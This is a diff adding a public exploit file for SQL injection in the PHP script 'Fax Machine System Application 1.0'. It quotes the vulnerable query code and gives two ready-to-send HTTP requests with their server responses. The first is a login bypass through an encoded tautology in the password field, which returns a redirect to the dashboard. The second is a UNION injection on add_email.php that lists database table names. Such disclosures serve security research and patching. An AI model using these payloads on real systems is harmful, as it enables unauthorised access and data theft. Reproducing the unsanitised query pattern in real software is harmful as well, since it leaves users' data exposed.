@@ -1,0 +1,84 @@
+# Exploit Title: Fax Machine System Application 1.0 - SQL Injection
+# Dork: N/A
+# Date: 2019-01-13
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://ranksol.com/
+# Software Link: https://codecanyon.net/item/twilio-web-to-fax-machine-system-application-php-script/22139608
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/login_check.php
+# 
+
+#07 			header("Location:login.php");
+#08 		}else{
+#09 			$email = $_POST['email'];
+#10 			$password = $_POST['password'];		
+#11 			$sql = "SELECT * FROM user WHERE email = '$email' AND password = '$password'";
+#12 			$result = $conn->query($sql);
+#13 			$counts     = mysqli_num_rows($result);       
+#14 			if($counts > 0){
+
+POST /[PATH]/login_check.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 75
+Cookie: PHPSESSID=5fd1dbc1e4c6b5876e1f44dbc157af9f
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+email=1&password=%27%6f%72%20%31%3d%31%20%6f%72%20%27%27%3d%27&submit=Login: undefined
+HTTP/1.1 302 Found
+Date: Sun, 13 Jan 2019 13:24:24 GMT
+Server: Apache
+X-Powered-By: PHP/7.1.25
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Location: dashboard.php
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/add_email.php?id=[SQL]
+# 
+
+#46     $sel = "select `id`, `number` from subscribers where id = '".$_REQUEST['id']."'";
+#47     $exe = @mysqli_query($conn,$sel);
+#48     $row = @mysqli_fetch_assoc($exe);
+#49     $subscriber_number = $row['number'];
+
+GET /[PATH]/add_email.php?id=-34%27%20union%20select%201,(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%2b1,4,0x30),0x3a20,table_name,0x3c62723e))))x)--%20- HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=5fd1dbc1e4c6b5876e1f44dbc157af9f
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+HTTP/1.1 200 OK
+Date: Sun, 13 Jan 2019 13:34:31 GMT
+Server: Apache
+X-Powered-By: PHP/7.1.25
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
